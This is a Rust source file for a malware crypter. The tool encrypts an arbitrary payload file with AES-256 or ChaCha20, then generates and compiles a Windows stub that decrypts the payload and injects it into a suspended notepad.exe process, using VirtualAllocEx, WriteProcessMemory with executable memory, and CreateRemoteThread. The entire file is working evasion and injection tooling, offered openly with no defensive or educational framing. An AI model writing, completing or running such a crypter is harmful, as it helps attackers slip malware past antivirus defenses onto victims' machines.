use std::fs;
use std::io::{self, Write};
use std::process::Command;
use std::path::Path;
use aes_gcm::{Aes256Gcm, Key, KeyInit, Nonce, aead::{Aead, AeadCore}};
use chacha20poly1305::{ChaCha20Poly1305, Key as ChaChaKey, Nonce as ChaChaNonce, aead::Aead as ChaChaAead};
use rand::rngs::OsRng;
use rand::RngCore;

fn main() {
    println!("Crypter :: Choose or die!");
    let output_format = user_choice("Select output format (1: EXE, 2: DLL): ", &["1", "2"]);
    let enc_method = user_choice("Select encryption method (1: AES-256, 2: ChaCha20): ", &["1", "2"]);
    let verbose_method = user_choice("Enable verbose mode? (y/n): ", &["y", "n"]);
    let input_file = user_input("Enter the path to the file you want to encrypt: ");

    let output_type = if output_format == "1" { "exe" } else { "dll" };
    let encryption_type = if enc_method == "1" { "AES-256" } else { "ChaCha20" };
    let verbose = verbose_method == "y";

    println!("Generating {} with {} encryption", output_type, encryption_type);

    let payload = fs::read(&input_file).expect("Unable to read input file");
    let (encrypted_payload, key, nonce) = encrypt_payload(&payload, encryption_type, verbose);

    generate_stub(&encrypted_payload, &key, &nonce, encryption_type, output_type);
}

fn user_choice(prompt: &str, valid: &[&str]) -> String {
    loop {
        print!("{}", prompt);
        io::stdout().flush().unwrap();
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();
        let choice = input.trim();
        if valid.contains(&choice) {
            return choice.to_string();
        } else {
            println!("Invalid Input");
        }
    }
}

fn user_input(prompt: &str) -> String {
    print!("{}", prompt);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

fn encrypt_payload(payload: &[u8], encryption_type: &str, verbose: bool) -> (Vec<u8>, Vec<u8>, Vec<u8>) {
    let key = generate_random_bytes(32);
    let nonce = generate_random_bytes(12);

    let encrypted = match encryption_type {
        "AES-256" => {
            let aes_key = Key::<Aes256Gcm>::from_slice(&key);
            let cipher = Aes256Gcm::new(aes_key);
            cipher.encrypt(Nonce::from_slice(&nonce), payload).expect("Encryption failed")
        },
        "ChaCha20" => {
            let cipher = ChaCha20Poly1305::new(ChaChaKey::from_slice(&key));
            cipher.encrypt(ChaChaNonce::from_slice(&nonce), payload).expect("Encryption failed")
        },
        _ => panic!("Invalid encryption type"),
    };

    if verbose {
        println!("[Verbose] Encryption successful.");
    }

    (encrypted, key, nonce)
}

fn generate_random_bytes(len: usize) -> Vec<u8> {
    let mut bytes = vec![0u8; len];
    OsRng.fill_bytes(&mut bytes);
    bytes
}

fn generate_stub(encrypted_payload: &[u8], key: &[u8], nonce: &[u8], encryption_type: &str, output_type: &str) {
    let project_path = "stub_project";
    let src_path = format!("{}/src", project_path);

    if !Path::new(&src_path).exists() {
        fs::create_dir_all(&src_path).expect("Failed to create stub project directories");
    }

    // Generate valid Rust array literals
    let stub_code = format!(
        r#"
        use std::ffi::CString;
        use std::ptr::null_mut;
        use windows::core::{{PCSTR, PSTR}};
        use windows::Win32::Foundation::HANDLE;
        use windows::Win32::System::Memory::{{VirtualAllocEx, MEM_COMMIT, PAGE_EXECUTE_READWRITE}};
        use windows::Win32::System::Threading::{{
            CreateProcessA, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA, CREATE_SUSPENDED, CreateRemoteThread
        }};
        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
        use aes_gcm::{{Aes256Gcm, Key, Nonce, aead::{{Aead, KeyInit}}}};
        use chacha20poly1305::{{ChaCha20Poly1305, Key as ChaChaKey, Nonce as ChaChaNonce, aead::Aead as ChaChaAead}};

        const ENCRYPTED_PAYLOAD: &[u8] = &{:?};
        const KEY: &[u8] = &{:?};
        const NONCE: &[u8] = &{:?};
        const ENCRYPTION_TYPE: &str = "{}";

        fn decrypt_and_execute() {{
            let decrypted = if ENCRYPTION_TYPE == "AES-256" {{
                let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(KEY));
                cipher.decrypt(Nonce::from_slice(NONCE), ENCRYPTED_PAYLOAD).expect("Decryption failed")
            }} else {{
                let cipher = ChaCha20Poly1305::new(ChaChaKey::from_slice(KEY));
                cipher.decrypt(ChaChaNonce::from_slice(NONCE), ENCRYPTED_PAYLOAD).expect("Decryption failed")
            }};

            let mut startup_info: STARTUPINFOA = unsafe {{ std::mem::zeroed() }};
            let mut process_info: PROCESS_INFORMATION = unsafe {{ std::mem::zeroed() }};

            let mut command_line = CString::new("C:\\Windows\\System32\\notepad.exe").unwrap();
            let mut command_line_buffer = command_line.into_bytes_with_nul();
            let command_line_ptr = PSTR(command_line_buffer.as_mut_ptr());

            let success = unsafe {{
                CreateProcessA(
                    PCSTR::null(),
                    command_line_ptr,
                    None,
                    None,
                    false,
                    CREATE_SUSPENDED,
                    None,
                    None,
                    &mut startup_info,
                    &mut process_info
                )
            }};

            if !success.as_bool() {{
                eprintln!("CreateProcessA failed");
                return;
            }}

            let base_address = unsafe {{
                VirtualAllocEx(
                    process_info.hProcess,
                    None,
                    decrypted.len(),
                    MEM_COMMIT,
                    PAGE_EXECUTE_READWRITE,
                )
            }};

            if base_address.is_null() {{
                eprintln!("VirtualAllocEx failed");
                return;
            }}

            let mem_success = unsafe {{
                WriteProcessMemory(
                    process_info.hProcess,
                    base_address,
                    decrypted.as_ptr() as _,
                    decrypted.len(),
                    None
                )
            }};

            if !mem_success.as_bool() {{
                eprintln!("WriteProcessMemory failed");
                return;
            }}

            let remote_thread = unsafe {{
                CreateRemoteThread(
                    process_info.hProcess,
                    None,
                    0,
                    Some(std::mem::transmute(base_address)),
                    Some(null_mut()), // Fix: Wrap `null_mut()` in `Some()`
                    0,
                    None
                )
            }}.expect("CreateRemoteThread failed"); // Fix: Handle the Result type


            if remote_thread.is_invalid() {{
                eprintln!("CreateRemoteThread failed");
                return;
            }}

            unsafe {{
                ResumeThread(process_info.hThread);
            }}
        }}

        fn main() {{
            decrypt_and_execute();
        }}
    "#,
        encrypted_payload, key, nonce, encryption_type
    );

    fs::write(format!("{}/src/main.rs", project_path), stub_code).expect("Failed to write stub code");

    println!("[*] Stub project created in stub_project/");

    let output = Command::new("cargo")
        .args(&["build", "--release"])
        .current_dir(project_path)
        .output()
        .expect("Failed to execute cargo build");

    if output.status.success() {
        let output_filename = format!("{}/target/release/stub{}", project_path, if output_type == "exe" { ".exe" } else { ".dll" });
        println!("[*] Compilation successful: {}", output_filename);
    } else {
        eprintln!("[!] Cargo build failed.");
        eprintln!("{}", String::from_utf8_lossy(&output.stderr));
    }
}
